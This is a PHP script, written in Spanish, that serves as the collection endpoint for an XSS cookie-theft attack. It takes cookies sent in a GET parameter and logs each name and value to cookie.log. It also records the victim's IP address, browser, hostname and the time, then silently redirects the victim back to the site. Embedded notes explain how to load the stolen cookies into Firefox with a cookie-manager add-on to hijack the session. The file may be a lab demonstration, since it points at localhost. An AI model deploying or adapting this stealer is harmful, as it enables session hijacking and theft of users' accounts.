<?php
require "../../librarys/Helper/Helper.php";
#session_start();
date_default_timezone_set("America/Caracas");
$cookie = $_GET["cookie"];
$cookie = explode("; ", $cookie);
//echo $cookie;

for($i=0; $i<count($cookie); $i++){
    $_cookie = explode("=", $cookie[$i]);
    $__cookie[] = array($_cookie[0] => $_cookie[1]);
}

$_hostCliente = explode("/", $_SERVER["HTTP_REFERER"]);
//$hostCliente = "http://" . $_hostCliente[2];
$hostCliente = "http://localhost/sirah";
$rutaDeArchivo = "cookie.log";
$server = $_SERVER["QUERY_STRING"]; //Lo que se envía
$contenido = PHP_EOL.PHP_EOL; 
$contenido .= "SUBSTRACCIÓN DE COOKIES CON ATAQUE XSS:". PHP_EOL.PHP_EOL;
$contenido .= "Fecha: ".date("d/m/Y"). PHP_EOL;
$contenido .= "Hora: ". Helper::convertirHoraA12H(date("H:i:s")) . PHP_EOL;
$contenido .= "IP Cliente: ".$_SERVER["REMOTE_ADDR"].PHP_EOL;
$contenido .= "HOST Cliente: " . $hostCliente . PHP_EOL;
$contenido .= "Navegador: ".$_SERVER["HTTP_USER_AGENT"].PHP_EOL;
$contenido .= "ISP: ".gethostbyaddr($_SERVER["REMOTE_ADDR"]).PHP_EOL; 
$contenido .= PHP_EOL; 
/*
$contenido .= /*"COOKIE: ".$cookie .*/PHP_EOL.PHP_EOL; 

#$contenido .= "DATOS DE COOKIE:".PHP_EOL;
$contenido .= "Cookies Substraidas:".PHP_EOL;
for($i=0; $i<count($__cookie); $i++) {
    foreach($__cookie[$i] as $llave => $valor) {
        //session_start();
        $n = $i+1;
        $contenido .= "\tN° $n => Nombre: " . $llave. PHP_EOL;
        $contenido .= "\tN° $n => Valor: " . $valor. PHP_EOL;
        #$contenido .= "$"."_COOKIE[\"".$llave."\"]"." = \"".$valor."\";".PHP_EOL;
        
    }
}
$contenido .= PHP_EOL;
$contenido .= "Nota: Reemplazar las cookies obtenidas en Mozilla Firefox para secuestrar la sesión.";
$contenido .= "\r\nCon el Complemento \"Cookies Manager+\" Para Firefox, se puede hacer esta operación.";
/*
if(setcookie("color", "rojo", 0, "/","sirah.no-ip.org"))
        echo "COOKIE CREADA<BR>";
else
    echo "ERROR AL CREAR COOKIE<BR>";
setcookie("color", "rojo", 0, "/");*/



        $archivo = fopen($rutaDeArchivo, "a+");        
        if (!isset($archivo)) {
                $result = 0;
        }
        else if (!fwrite($archivo, $contenido)) {
                $result = 0;
        } else {
            $result = 1;
        }
        fclose($archivo);

header("location: $hostCliente");



?>